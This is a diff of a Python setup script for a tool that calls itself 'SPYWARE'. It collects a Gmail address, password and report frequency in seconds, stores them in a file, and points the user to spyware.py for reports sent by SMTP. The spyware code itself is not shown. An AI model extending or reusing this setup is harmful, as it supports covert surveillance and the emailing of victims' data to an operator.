@@ -5,10 +5,11 @@ from pyfiglet import figlet_format
 import re
 
 
-def create_file(email, password):
+def create_file(email, password, report_period):
     info = {
         'email': email,
-        'password': password
+        'password': password,
+        'frequency': report_period
     }
 
     if not os.path.isdir('./user_info'):
@@ -39,19 +40,20 @@ def get_email():
             print('Wrong email!\n')
 
 
-
 def main():
     app_name = colored(figlet_format('SPYWARE'), color='magenta')
 
     print(app_name)
-    print('-By dszyszek')
+    print('- By dszyszek')
     print('===============================================================\n')
     print('You\'ll need gmail account to process (program uses their SMTP server)')
 
     email = get_email()
 
     passwword = input('Password: ')
-    create_file(email, passwword)
+    report_period = input('Input frequency of reports (in seconds): ')
+
+    create_file(email, passwword, report_period)
 
     print(colored('\nOk, we\'re set, now run spyware.py file', color='yellow'))
 
